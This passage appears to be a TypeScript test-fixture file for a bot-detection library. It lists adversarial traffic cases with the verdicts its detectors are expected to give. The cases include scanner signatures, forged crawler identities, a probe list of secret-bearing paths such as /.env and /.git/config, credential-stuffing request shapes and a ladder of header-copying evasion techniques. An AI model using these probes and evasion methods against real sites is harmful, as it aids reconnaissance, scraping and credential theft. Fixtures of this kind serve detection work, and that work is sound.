import { browser, plain, userAgentOf } from "./headers.js";
import { bot, repeat } from "./schema.js";
import { GOOGLEBOT_IP, OUT_OF_RANGE } from "./ranges.js";
import type { TrafficCase } from "./schema.js";

/**
 * Traffic that is trying not to be caught.
 *
 * This is where the library's limits are honest rather than flattering. The cases run
 * from crude to genuinely hard, and the hard ones are expected to *not* be proven —
 * because they are not provable from a single request, and claiming otherwise is how
 * a detector starts blocking people.
 *
 * The progression is deliberate:
 *
 * 1. A scraper that copies a User-Agent and nothing else. Caught easily.
 * 2. One that copies the whole header set but not the order. Caught, weakly.
 * 3. One that copies the order too. Not caught from one request — only behaviour is
 *    left, and behaviour cannot prove anything.
 * 4. One that also paces itself like a person. Not caught at all, and the corpus says
 *    so rather than inventing a signal.
 */

const CHROME_UA = userAgentOf("chromeWindows");
const CURL_UA = "curl/8.4.0";

export const ADVERSARIAL_CASES: TrafficCase[] = [
  bot({
    id: "two-scanners-one-address",
    title: "One address arriving as two different security tools",
    audience: "hostile",
    category: "scanning",
    provenance:
      "The shape of an actual scan: an operator runs more than one tool against a target, and both announce themselves honestly. Each request on its own is a declared bot; the pair is a scan, and that reading does not exist inside either request.",
    requests: [
      { headers: [["Host", "shop.example"], ["User-Agent", "sqlmap/1.7.2#stable (http://sqlmap.org)"], ["Accept", "*/*"]], ip: "198.51.100.66", atMs: 0 },
      { headers: [["Host", "shop.example"], ["User-Agent", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"], ["Accept", "*/*"]], ip: "198.51.100.66", atMs: 1_000 },
    ],
    expect: { verdict: "confirmed-bot", certain: true, detectors: ["blended-identity"] },
    notes:
      "Holds under the default address-based actor key, which is what separates it from `identity-rotation`. A NAT gateway presents a hundred browsers — that is exactly why counting User-Agents there is useless — and it does not present sqlmap and nikto.",
  }),

  bot({
    id: "two-crawler-claims-one-address",
    title: "One address claiming to be both Googlebot and Bingbot",
    audience: "hostile",
    category: "impersonation",
    provenance:
      "At most one of these can be true of an address: each operator publishes a proof tied to addresses it controls. The contradiction is visible from the claims alone, with no lookup — which matters when DNS is unreachable and neither claim can be refuted on its own.",
    requests: [
      { headers: [["Host", "shop.example"], ["User-Agent", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"], ["Accept", "*/*"]], ip: "198.51.100.67", atMs: 0 },
      { headers: [["Host", "shop.example"], ["User-Agent", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"], ["Accept", "*/*"]], ip: "198.51.100.67", atMs: 1_000 },
    ],
    expect: { detectors: ["blended-identity"] },
    notes:
      "Held at `strong` rather than `certain`. Trusting the wrong forwarded header collapses every client onto one address, and then two genuinely different crawlers produce this exact set — so it may contribute to a denial and may not be the whole of one.",
  }),

  bot({
    id: "id-harvest-contiguous",
    title: "Every profile id in order, with a copied browser header set",
    audience: "hostile",
    category: "scraping",
    provenance:
      "Harvesting by identifier rather than by link: the shape of an IDOR sweep and of profile collection. Distinct-path breadth reads it as somebody who visited a lot of pages, which is also what it reads when a person works through a documentation site.",
    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.65" }, 40, 800, (index) => `/user/${index + 1}`),
    expect: {
      // One `moderate` signal against a flawless header set, like the others here. What
      // changed is that the walk is now *visible* — before this detector it was scored
      // identically to a hundred and twenty scattered ids and to ordinary article paths.
      verdict: "unknown",
      detectors: ["id-enumeration"],
    },
    notes:
      "What separates this from reading is not which ids were asked for but that they cover a range: people arrive at ids through links, and links do not densely enumerate an integer interval. Held at `moderate` because products in one category often carry consecutive ids, so somebody browsing a catalogue makes a smaller version of this shape.",
  }),

  bot({
    id: "wordlist-scan-mostly-misses",
    title: "A wordlist walked with a copied browser header set, almost all of it missing",
    audience: "hostile",
    category: "scanning",
    provenance:
      "The oldest tell there is, and the one this library could not see: it decides before the response exists, which is what lets it shape the response and also what hides the status from it. A person browsing does not generate thirty misses in a row; a wordlist does almost nothing else.",
    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.64", status: 404 }, 30, 700, (index) => `/${["admin", "backup", "old", "test", "config", "db"][index % 6]}-${index}`),
    expect: {
      // One `moderate` signal against an otherwise flawless header set does not cross the
      // line, and it should not: a site that has just moved its URLs produces the same
      // shape from ordinary readers. Raising the ceiling so this case reads better would
      // be tuning the detector to the test rather than to the traffic.
      verdict: "unknown",
      detectors: ["probe-volume"],
    },
    notes:
      "Only counts 404 and 410. A 403 is usually this library's own doing, and counting it would let a rule that challenges an actor manufacture the evidence for having challenged it; a 500 is the site's problem and says nothing about the client. Capped at `moderate` because a site that has just moved its URLs produces this from perfectly ordinary readers.",
  }),

  bot({
    id: "browser-claim-over-http-1-0",
    title: "A perfect Chrome header set, arriving over HTTP/1.0",
    audience: "hostile",
    category: "impersonation",
    provenance:
      "Most tooling lets you set headers and does not let you choose an HTTP version, so the transport is the half a copied header set does not cover. No shipping browser has offered HTTP/1.0 to a server in well over a decade.",
    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.62", httpVersion: "1.0" }, 30, 900, (index) => `/${["news", "about", "blog", "help", "terms"][index % 5]}`),
    expect: {
      // Contributes rather than concludes. On its own, against an otherwise flawless
      // header set, one `moderate` signal does not reach the threshold — and it should
      // not, because an intermediary can cause this. Beside anything sharper it does.
      verdict: "unknown",
      detectors: ["transport-coherence"],
    },
    notes:
      "Capped at `moderate` because it is not always the client's doing: a few older load balancers speak HTTP/1.0 to the origin, and behind one of those every request looks like this. That is what `transportCoherenceDetector({ legacyHttp: false })` is for, and why this may never deny anybody on its own.",
  }),

  // ---------------------------------------------------------------------------
  // The optional sources. None of these can be detected without the operator
  // switching something on — a marker cookie, or a site-wide baseline — so each
  // exists to hold that feature to the same standard as everything shipped by
  // default. See `docs/detection/correlation.md`.
  // ---------------------------------------------------------------------------

  bot({
    id: "marker-held-while-identity-changes",
    title: "One client presenting a marker it was issued as Chrome, then as curl",
    audience: "unwanted-bot",
    category: "evasion",
    provenance:
      "Identity rotation, which is invisible without a marker. Correlating by address cannot tell this apart from two people sharing an office connection, so the library declined to guess. A signed cookie removes the ambiguity: both requests carried an HMAC only this server can produce.",
    requires: ["marker-probe"],
    requests: [
      ...repeat({ ...browser("chromeWindows"), ip: "198.51.100.81", headers: [...browser("chromeWindows").headers, ["Cookie", "sid=held"]] }, 4, 1500, (i) => `/products/${i}`),
      ...repeat({ ...plain(CURL_UA), ip: "198.51.100.81", headers: [...plain(CURL_UA).headers, ["Cookie", "sid=held"]] }, 4, 1500, (i) => `/products/${i + 4}`).map((request) => ({ ...request, atMs: (request.atMs ?? 0) + 6000 })),
    ],
    expect: { verdict: "confirmed-bot", detectors: ["identity-drift"] },
    notes:
      "The browser family carries the weight and the platform does not, because a phone with `Request desktop site` changes its platform and is a person. Software does not change what it is.",
  }),

  bot({
    id: "marker-never-stored-though-cookies-sent",
    title: "A client replaying a captured session cookie and storing nothing new",
    audience: "unwanted-bot",
    category: "scraping",
    provenance:
      "A scraper handed a session header to copy. It sends the one cookie it was configured with on every request and never stores anything the server sets, which a browser with a jar does not do.",
    requires: ["marker-probe"],
    keepsCookies: false,
    requests: repeat(
      { ...browser("chromeWindows"), ip: "198.51.100.82", headers: [...browser("chromeWindows").headers, ["Cookie", "sid=captured-elsewhere"]] },
      9,
      1200,
      (i) => `/products/${i}`,
    ),
    expect: { verdict: "unknown", detectors: ["marker-persistence"] },
    notes:
      "Deliberately narrower than `session-integrity`, which already reports a client sending no cookie at all. Overlapping them double-counted one observation and the population it landed on was people who block cookies.",
  }),

  bot({
    id: "marker-edited-by-its-holder",
    title: "A client that edited the signed cookie it was given",
    audience: "unwanted-bot",
    category: "evasion",
    provenance:
      "Browsers do not edit their own cookies. A marker failing its HMAC was altered by whoever held it, and the only reason to alter an opaque signed value is to see what the server does with a different one.",
    requires: ["marker-probe"],
    keepsCookies: false,
    requests: repeat(
      { ...browser("chromeWindows"), ip: "198.51.100.83", headers: [...browser("chromeWindows").headers, ["Cookie", "__bh_m=eyJ2IjoxfQ.not-a-signature-this-server-made"]] },
      4,
      1500,
      (i) => `/account/${i}`,
    ),
    expect: { verdict: "unknown", detectors: ["marker-integrity"] },
    notes:
      "Stops at `strong` rather than `certain` because a middlebox or a broken cookie jar can mangle a value in transit. That is rare, it is not the client's fault, and it should cost a challenge rather than a door.",
  }),

  bot({
    id: "marker-carried-across-a-proxy-pool",
    title: "One marker presented from twenty different networks",
    audience: "unwanted-bot",
    category: "scraping",
    provenance:
      "A scraper on a rotating proxy pool that keeps its cookie jar, which most of them do because discarding it breaks the sites they are taking. The marker comes back only from the client that received it, so this is one client across twenty networks.",
    requires: ["marker-probe"],
    requests: Array.from({ length: 20 }, (_, index) => ({
      ...browser("chromeWindows"),
      headers: [...browser("chromeWindows").headers, ["Cookie", "sid=pooled"] as [string, string]],
      ip: `198.51.${140 + index}.9`,
      path: `/catalogue/${index}`,
      atMs: index * 2500,
    })),
    expect: { verdict: "unknown", detectors: ["marker-fanout"] },
    notes:
      "Capped at `moderate` and offered no higher: a phone on a carrier using CGNAT can be renumbered across a great many /24s in the twelve hours a marker lives, and so can anyone whose employer egresses through a rotating pool.",
  }),

  bot({
    id: "range-walked-across-many-clients",
    title: "An id range divided between ten clients so none of them walks enough to notice",
    audience: "unwanted-bot",
    category: "scraping",
    provenance:
      "The threat every per-actor threshold misses by construction. Split a range across enough addresses and each one is unremarkable, `id-enumeration` fires for nobody, and the range is still walked end to end. It is only visible in the union.",
    requires: ["site-baseline"],
    requests: Array.from({ length: 200 }, (_, index) => ({
      ...browser("chromeWindows"),
      ip: `198.51.${170 + (index % 10)}.5`,
      path: `/user/${index + 1}`,
      atMs: index * 900,
    })),
    expect: { verdict: "unknown", detectors: ["distributed-walk"] },
    notes:
      "Coverage and the revisit ratio must both agree. Many clients on numbered pages is what a catalogue is; what a catalogue also has, and an enumeration does not, is people returning to the same popular items.",
  }),

  bot({
    id: "fresh-path-wanted-by-everybody",
    title: "A path this site never served, requested at once by twenty unrelated clients",
    audience: "unwanted-bot",
    category: "recon",
    provenance:
      "What a freshly disclosed vulnerability looks like from inside a site: a URL nobody had ever requested is requested by hundreds of unrelated clients within the hour, each making a single request and moving on.",
    requires: ["site-baseline"],
    requests: Array.from({ length: 20 }, (_, index) => ({
      ...plain(CURL_UA),
      ip: `198.51.${190 + index}.11`,
      path: "/vendor/proprietary-thing/rce.php",
      status: 404,
      atMs: index * 3000,
    })),
    expect: { verdict: "unknown", detectors: ["path-campaign"] },
    notes:
      "The miss rate is required rather than optional. Many clients arriving at once on a brand-new URL is also exactly what a successful launch looks like; what separates them is whether the site had anything to serve.",
  }),

  bot({
    id: "missing-far-more-than-this-site-does",
    title: "A client answered \"not found\" far more often than the site answers it at all",
    audience: "unwanted-bot",
    category: "recon",
    provenance:
      "A fixed miss threshold is wrong on both kinds of site: on one mid-migration it reports everybody, and on a tidy one it stays silent while a client misses a third of the time. The site's own rate is the only honest comparison.",
    requires: ["site-baseline"],
    requests: repeat({ ...plain(CURL_UA), ip: "198.51.210.12", status: 404 }, 26, 1100, (i) => `/backup-${i}.sql`),
    expect: { verdict: "unknown", detectors: ["miss-baseline"] },
    notes:
      "Shares the `misses` family with `probe-volume`, which reads the same misses against a fixed threshold. One cause, so the stronger reading stands rather than the two summing.",
  }),

  bot({
    id: "solution-farm-replaying-answers",
    title: "A client answering challenges with solutions that have already been spent",
    audience: "unwanted-bot",
    category: "evasion",
    provenance:
      "What a solved-challenge farm looks like from the server. A challenge nonce is random, single-use and signed, so a second valid solution for one is the same answer sent twice or one answer handed around — neither of which a browser does. One replay is a retried POST on a flaky connection, which is why the threshold is not one.",
    challengeHistory: { replayedSolutions: 4, implausibleSolves: 2 },
    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.71" }, 6, 1500, () => "/account"),
    expect: {
      // A shape worth reporting and not worth concluding from: the client is otherwise
      // indistinguishable from the browser whose headers it copied.
      verdict: "unknown",
      detectors: ["challenge-integrity"],
    },
    notes:
      "The proof-of-work floor is measured on the server between issuing and receiving, so no client clock is involved, and it is set at a SHA-256 rate no browser has ever reached. Both signals stay `moderate`: they say the answers did not come from the page we served, which is a fact about the answering software rather than proof about the traffic it is attached to.",
  }),

  bot({
    id: "head-only-visit",
    title: "A visit made entirely of HEAD, claiming a browser",
    audience: "unwanted-bot",
    category: "scraping",
    provenance:
      "Checking what exists without reading any of it: link checkers, availability monitors and inventory watchers all do this, and a browser navigating never does.",
    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.63", method: "HEAD" }, 30, 900, (index) => `/${["news", "about", "blog", "help", "terms"][index % 5]}`),
    expect: {
      // As above: a shape worth reporting, not worth concluding from alone.
      verdict: "unknown",
      detectors: ["transport-coherence"],
    },
    notes:
      "One HEAD is a browser checking a link it is about to follow, or a cache revalidating; the shape only means anything across a visit, which is why it is counted on the actor rather than on the request. A link checker is a real and mostly harmless thing to be, so this stays `moderate`.",
  }),

  bot({
    id: "catalogue-sweep-by-page",
    title: "A catalogue taken a page at a time, with the path never changing",
    audience: "unwanted-bot",
    category: "scraping",
    provenance:
      "How a catalogue is actually taken. The collector copies a browser's headers exactly and walks ?page=1..N, which leaves the path constant — so distinct-path breadth reads it as somebody rereading one page rather than as enumeration.",
    requests: repeat({ ...browser("chromeWindows"), ip: "198.51.100.61" }, 40, 900, (index) => `/products?page=${index}`),
    expect: {
      // Not proven, and not even suspected at this pace. Said plainly because it is true:
      // headers this clean leave only behaviour, behaviour is weak by construction, and a
      // collector polite enough to space its requests stays under the line. What changed
      // is that it no longer scores *lower* than the identical crawl expressed as distinct
      // paths — measured at a faster pace before this detector existed, the two differed by
      // seven points and only the path version crossed; they now score the same at every
      // volume tried.
      verdict: "unknown",
      detectors: ["parameter-sweep"],
    },
    notes:
      "The counterpart to crawl-breadth rather than a replacement for it: breadth counts paths, this counts what is hung on them. Both stay weak, and both are worth having because a collector picks one shape or the other and nothing says which. Neither is a reason to deny anybody on its own.",
  }),

  // ---------------------------------------------------------------------------
  // Forged identities. The narrow case where a lie is provable.
  // ---------------------------------------------------------------------------
  bot({
    id: "forged-googlebot-wrong-ptr",
    title: "A forged Googlebot whose address reverse-resolves elsewhere",
    audience: "hostile",
    category: "impersonation",
    provenance: "The commonest forgery: claim the crawler every site allows",
    notes: "Proven, not suspected. Google publishes a DNS-based proof and the lookup returns a definitive contradiction.",
    requests: [{ ...plain("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"), ip: "192.0.2.44" }],
    dns: { reverse: { "192.0.2.44": ["vps-4471.cheap-hosting.example"] } },
    expect: { verdict: "confirmed-bot", botClass: "impersonator", certain: true, identity: "googlebot", detectors: ["crawler-verification"] },
    tags: ["impersonation", "verification"],
  }),
  bot({
    id: "forged-googlebot-no-ptr",
    title: "A forged Googlebot from an address with no PTR record at all",
    audience: "hostile",
    category: "impersonation",
    provenance: "Every address a verifiable crawler uses has a PTR record; a bare VPS usually does not",
    notes: "NXDOMAIN is a definitive answer, unlike a timeout. That distinction is what separates this case from `googlebot-dns-unavailable`.",
    requests: [{ ...plain("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"), ip: "192.0.2.45" }],
    dns: {},
    expect: { verdict: "confirmed-bot", botClass: "impersonator", certain: true, identity: "googlebot" },
    tags: ["impersonation", "verification"],
  }),
  bot({
    id: "forged-googlebot-suffix-trick",
    title: "A forgery whose PTR merely contains the operator's domain",
    audience: "hostile",
    category: "impersonation",
    provenance: "googlebot.com.attacker.example resolves under a domain the attacker controls",
    notes: "The reason domain matching is on label boundaries and not a substring test.",
    requests: [{ ...plain("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"), ip: "192.0.2.46" }],
    dns: { reverse: { "192.0.2.46": ["googlebot.com.attacker.example"] }, forward: { "googlebot.com.attacker.example": ["192.0.2.46"] } },
    expect: { verdict: "confirmed-bot", botClass: "impersonator", certain: true },
    tags: ["impersonation", "verification"],
  }),
  bot({
    id: "forged-googlebot-forward-mismatch",
    title: "A forgery with a PTR it controls that does not resolve back",
    audience: "hostile",
    category: "impersonation",
    provenance: "Anyone controlling reverse DNS for their own address can point it at googlebot.com; only the forward confirmation stops them",
    requests: [{ ...plain("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"), ip: "192.0.2.47" }],
    dns: { reverse: { "192.0.2.47": ["crawl-1.googlebot.com"] }, forward: { "crawl-1.googlebot.com": [GOOGLEBOT_IP] } },
    expect: { verdict: "confirmed-bot", botClass: "impersonator", certain: true },
    tags: ["impersonation", "verification"],
  }),
  bot({
    id: "forged-bingbot",
    title: "A forged bingbot",
    audience: "hostile",
    category: "impersonation",
    provenance: "The same trick against the second most-allowed crawler",
    requests: [{ ...plain("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"), ip: "192.0.2.48" }],
    dns: { reverse: { "192.0.2.48": ["static.192-0-2-48.example.net"] } },
    expect: { verdict: "confirmed-bot", botClass: "impersonator", certain: true },
    tags: ["impersonation"],
  }),
  bot({
    id: "forged-claudebot",
    requires: ["crawler-ranges"],
    title: "A forged ClaudeBot from outside the published range",
    audience: "hostile",
    category: "impersonation",
    provenance: "AI crawlers are increasingly allowlisted, which makes them worth forging",
    requests: [{ ...plain("Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)"), ip: OUT_OF_RANGE }],
    expect: { verdict: "confirmed-bot", botClass: "impersonator", certain: true, identity: "claudebot" },
    tags: ["impersonation", "verification"],
  }),

  // ---------------------------------------------------------------------------
  // The evasion ladder.
  // ---------------------------------------------------------------------------
  bot({
    id: "scraper-copied-ua-only",
    title: "Level 1: a scraper that copied a Chrome User-Agent and nothing else",
    audience: "unwanted-bot",
    category: "evasion-ladder",
    provenance: "The overwhelming majority of scraping. One header changed, everything else default.",
    notes:
      "Missing Accept-Language, missing Sec-Fetch, missing Client Hints, and Accept is */* on a navigation. Four observations — but *not* four independent ones: the first three are absences with one shared benign explanation, a stripping intermediary, so they collapse to their strongest member rather than compounding. That is why this scores in the sixties rather than the nineties, and it is deliberate: the same four absences arrive together from a corporate proxy in front of a real person.",
    requests: [{ headers: [["Host", "shop.example"], ["User-Agent", CHROME_UA], ["Accept", "*/*"], ["Accept-Encoding", "gzip, deflate"]], protocol: "https", httpVersion: "1.1" }],
    expect: { verdict: "suspected-bot", certain: false, minScore: 60, detectors: ["header-integrity"] },
    tags: ["evasion"],
  }),
  bot({
    id: "scraper-copied-headers-wrong-order",
    title: "Level 2: a scraper that copied the whole header set but not the order",
    audience: "unwanted-bot",
    category: "evasion-ladder",
    provenance: "Copying headers out of devtools into a dict loses the order, because a dict has none",
    notes: "Everything a browser sends, in an order no browser sends it in. Only the ordering rules and the missing hints are left.",
    requests: [
      {
        headers: [
          ["Host", "shop.example"],
          ["Accept-Encoding", "gzip, deflate, br"],
          ["Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"],
          ["Accept-Language", "en-US,en;q=0.9"],
          ["User-Agent", CHROME_UA],
          ["Sec-Fetch-Site", "none"],
          ["Sec-Fetch-Mode", "navigate"],
          ["Sec-Fetch-User", "?1"],
          ["Sec-Fetch-Dest", "document"],
          ["Upgrade-Insecure-Requests", "1"],
          ["Connection", "keep-alive"],
        ],
        protocol: "https",
        httpVersion: "1.1",
      },
    ],
    expect: { certain: false, detectors: ["header-order"], neverAction: ["drop"] },
    tags: ["evasion"],
  }),
  bot({
    id: "scraper-perfect-headers",
    title: "Level 3: a scraper that copied the header set, the order and the hints",
    audience: "unwanted-bot",
    category: "evasion-ladder",
    provenance: "What a competent scraping stack sends in 2026, using a browser-impersonating TLS library",
    notes:
      "Indistinguishable from a browser on a single request, and the library says so: no evidence, verdict unknown. Anything else would be an invented signal. Only behaviour over time can separate this, and behaviour cannot prove anything — which is exactly why it may not block.",
    requests: [browser("chromeWindows")],
    expect: { verdict: "unknown", maxScore: 0 },
    tags: ["evasion", "known-limit"],
  }),
  bot({
    id: "scraper-perfect-headers-machine-paced",
    title: "Level 4: the same scraper, enumerating at a machine-perfect rhythm",
    audience: "unwanted-bot",
    category: "evasion-ladder",
    provenance: "Perfect headers, and a request every two seconds to stay under a rate limit",
    notes:
      "Rate counting sees nothing — thirty requests over a minute is unremarkable. Cadence sees a coefficient of variation near zero, which no person produces. This is the case where behaviour earns its place.",
    requests: Array.from({ length: 20 }, (_, index) => ({ ...browser("chromeWindows"), path: `/products/${index + 1}`, atMs: index * 2_000 })),
    expect: { certain: false, detectors: ["cadence"], neverAction: ["drop"] },
    tags: ["evasion"],
  }),
  bot({
    id: "scraper-perfect-headers-human-paced",
    title: "Level 5: perfect headers, human pacing, one page at a time",
    audience: "unwanted-bot",
    category: "evasion-ladder",
    provenance: "A distributed scrape: each address takes a handful of pages at irregular intervals and never returns",
    notes:
      "Not detected, and the corpus records that plainly. At this point the difference from a person has stopped being technical — there is no signal left at the HTTP layer. What defeats this is cost, not detection: a proof of work, or an account.",
    requests: [
      { ...browser("chromeWindows"), path: "/products/501", atMs: 0 },
      { ...browser("chromeWindows"), path: "/products/502", atMs: 7_400 },
      { ...browser("chromeWindows"), path: "/products/503", atMs: 23_100 },
    ],
    expect: { verdict: "unknown", maxScore: 30 },
    tags: ["evasion", "known-limit"],
  }),

  // ---------------------------------------------------------------------------
  // Traps: detection by construction rather than by inference.
  // ---------------------------------------------------------------------------
  bot({
    id: "trap-path-followed",
    title: "Following a link hidden from layout and from assistive technology",
    audience: "unwanted-bot",
    category: "trap",
    provenance: "A link rendered off-screen with aria-hidden and tabindex=-1, and disallowed in robots.txt",
    notes:
      "The only detector whose false-positive rate does not depend on how well the internet is behaving. It does not model what bots look like; it constructs a situation only a bot can be in.",
    requests: [{ ...browser("chromeWindows"), path: "/internal/export.csv" }],
    expect: { verdict: "confirmed-bot", certain: true, detectors: ["trap"] },
  }),
  bot({
    id: "trap-field-filled",
    title: "Filling a hidden form field",
    audience: "hostile",
    category: "trap",
    provenance: "A honeypot input that is rendered but unreachable by pointer, keyboard or screen reader",
    notes: "Rendering the field and forgetting to register its name with the detector is a mistake that fails silently — which is why this case declares the dependency rather than assuming it.",
    requires: ["trap-form-field:company_url"],
    requests: [{ ...browser("chromeWindows"), method: "POST", path: "/contact?company_url=http%3A%2F%2Fspam.example" }],
    expect: { verdict: "confirmed-bot", certain: true, detectors: ["trap"] },
  }),

  // ---------------------------------------------------------------------------
  // Attacks. Not this library's job to stop, but its job to describe.
  // ---------------------------------------------------------------------------
  bot({
    id: "credential-stuffing-browserlike",
    title: "Credential stuffing from a browser-shaped client",
    audience: "hostile",
    category: "attack",
    provenance: "Modern stuffing runs through headless browsers with correct headers, at a steady rate",
    notes:
      "Nothing here is provable, and that is the point of the `delay` action: a quarter of a second per attempt is imperceptible to a person filling in a form and removes the throughput the attack depends on, while excluding nobody.",
    requests: Array.from({ length: 12 }, (_, index) => ({ ...browser("chromeWindows"), method: "POST", path: "/login", atMs: index * 900 })),
    expect: { certain: false, neverAction: ["drop"] },
    tags: ["attack"],
  }),
  bot({
    id: "credential-stuffing-scripted",
    title: "Credential stuffing from a bare script",
    audience: "hostile",
    category: "attack",
    provenance: "The cheap version, and still the common one",
    requests: Array.from({ length: 12 }, (_, index) => ({
      headers: [["Host", "shop.example"], ["User-Agent", "python-requests/2.32.3"], ["Accept-Encoding", "gzip, deflate"], ["Accept", "*/*"], ["Content-Type", "application/x-www-form-urlencoded"]] as const,
      method: "POST",
      path: "/login",
      protocol: "https" as const,
      httpVersion: "1.1",
      atMs: index * 250,
    })),
    expect: { verdict: "confirmed-bot", botClass: "http-client", certain: true },
    tags: ["attack"],
  }),
  bot({
    id: "path-enumeration",
    title: "Enumerating admin paths",
    audience: "hostile",
    category: "attack",
    provenance: "Content discovery against a list of common paths",
    requests: ["/admin", "/wp-admin", "/.env", "/.git/config", "/phpmyadmin", "/backup.zip", "/config.json", "/api/v1/users", "/actuator/env", "/server-status"].map((path, index) => ({
      ...plain("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
      path,
      atMs: index * 80,
    })),
    expect: { certain: false, neverAction: ["drop"] },
    notes: "This library classifies traffic; it does not recognise attack payloads. For that, put a honeypot or a WAF alongside it.",
    tags: ["attack", "known-limit"],
  }),
  bot({
    id: "http2-connection-header",
    title: "A hand-assembled HTTP/2 request carrying a connection-specific header",
    audience: "hostile",
    category: "protocol-abuse",
    provenance: "RFC 9113 §8.2.2 forbids connection-specific header fields in HTTP/2 and requires endpoints to treat them as malformed",
    notes: "One of very few deterministic signals available from a single request: every compliant client honours this, so a violation means the request was assembled by something that does not implement the protocol.",
    requests: [{ headers: [["Host", "shop.example"], ["User-Agent", CHROME_UA], ["Accept", "*/*"], ["Connection", "keep-alive"], ["Transfer-Encoding", "chunked"]], protocol: "https", httpVersion: "2.0" }],
    expect: { verdict: "confirmed-bot", certain: true, detectors: ["header-integrity"] },
  }),
  bot({
    id: "ua-rotation-single-actor",
    title: "One actor cycling through a User-Agent list",
    audience: "unwanted-bot",
    category: "evasion",
    provenance: "A scraper rotating identities from a list, from one address",
    notes:
      "Only meaningful when the actor key is narrower than an address — behind a NAT this shape is a busy office. The detector that catches it ships disabled for exactly that reason, so the default configuration is expected to miss this.",
    requests: [
      { ...plain(userAgentOf("chromeWindows")), path: "/p/1", atMs: 0 },
      { ...plain(userAgentOf("firefoxWindows")), path: "/p/2", atMs: 400 },
      { ...plain(userAgentOf("safariMac")), path: "/p/3", atMs: 800 },
      { ...plain(userAgentOf("edgeWindows")), path: "/p/4", atMs: 1_200 },
      { ...plain(userAgentOf("chromeAndroid")), path: "/p/5", atMs: 1_600 },
    ],
    expect: { certain: false, neverAction: ["drop"] },
    tags: ["evasion", "known-limit"],
  }),

  // ---------------------------------------------------------------------------
  // Fabricated User-Agents. Not a copied one — an assembled one.
  //
  // A scraping stack that reaches for a "random user agent" package gets a string
  // drawn from independent lists of browsers, versions and platforms, and nothing in
  // the package checks that the combination is a build that shipped. The result reads
  // convincingly to a human eye and describes a client that has never existed.
  // ---------------------------------------------------------------------------
  bot({
    id: "ua-forged-chrome-on-iphone",
    title: "A randomised User-Agent claiming Chrome on an iPhone",
    audience: "unwanted-bot",
    category: "ua-forgery",
    provenance: "The commonest output of a UA-randomiser: a desktop Chrome token glued to an iOS platform block",
    notes:
      "Apple requires every iOS browser to use the system WebKit, so Chrome for iOS reports CriOS and an AppleWebKit build of 605.1.15. A string with iPhone, Chrome/ and AppleWebKit/537.36 in it is describing a browser Apple does not permit to exist. Still not `certain`: a person running a UA-spoofing extension produces fabricated strings too.",
    requests: [{ ...plain("Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36", [["Accept-Language", "en-US,en;q=0.9"], ["Accept-Encoding", "gzip, deflate, br"]]) }],
    expect: { certain: false, detectors: ["ua-coherence"], neverAction: ["block", "drop"] },
    tags: ["evasion", "ua-forgery"],
  }),
  bot({
    id: "ua-forged-two-platforms",
    title: "A User-Agent naming Windows and macOS at once",
    audience: "unwanted-bot",
    category: "ua-forgery",
    provenance: "A template concatenated with a platform block that was already there",
    requests: [{ ...plain("Mozilla/5.0 (Windows NT 10.0; Win64; x64; Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36", [["Accept-Language", "en-GB,en;q=0.9"], ["Accept-Encoding", "gzip, deflate, br"]]) }],
    expect: { certain: false, detectors: ["ua-coherence"], neverAction: ["block", "drop"] },
    tags: ["evasion", "ua-forgery"],
  }),
  bot({
    id: "ua-forged-gecko-in-webkit",
    title: "A User-Agent claiming Firefox with an AppleWebKit engine",
    audience: "unwanted-bot",
    category: "ua-forgery",
    provenance: "A Chromium template with the browser token swapped for Firefox and the engine block left alone",
    notes: "Gecko has never reported AppleWebKit. Firefox on iOS is WebKit and says FxiOS, never Firefox/.",
    requests: [{ ...plain("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/141.0", [["Accept-Language", "en-US,en;q=0.5"], ["Accept-Encoding", "gzip, deflate, br"]]) }],
    expect: { certain: false, detectors: ["ua-coherence"], neverAction: ["block", "drop"] },
    tags: ["evasion", "ua-forgery"],
  }),
  bot({
    id: "ua-stranded-chrome-on-windows-7",
    title: "Current Chrome on a Windows release Chrome no longer supports",
    audience: "unwanted-bot",
    category: "ua-forgery",
    provenance: "Randomised platform blocks still carry Windows NT 6.1 long after Chrome stopped shipping for it",
    notes:
      "The weakest thing `ua-coherence` reports, and deliberately so. Google's last Windows 7 release was Chrome 109, but Supermium and Thorium ship current Chromium on retired Windows to a real if small population — so this is `moderate`, it is one signal among several, and on its own it does nothing but tag.",
    requests: [{ ...browser("chromeWindows"), headers: browser("chromeWindows").headers.map((header) => (header[0] === "User-Agent" ? (["User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"] as const) : header)) }],
    expect: { certain: false, detectors: ["ua-coherence"], maxScore: 45, neverAction: ["block", "drop"] },
    tags: ["evasion", "ua-forgery", "known-cost"],
  }),

  // ---------------------------------------------------------------------------
  // Wordlists. What the request asks for, rather than who is asking.
  //
  // These carry a real browser's header set, in a real browser's order, with the
  // Client Hints intact — everything the consistency detectors read is correct,
  // because the client copied it correctly. What gives them away is that no link on
  // any site points at what they are asking for.
  // ---------------------------------------------------------------------------
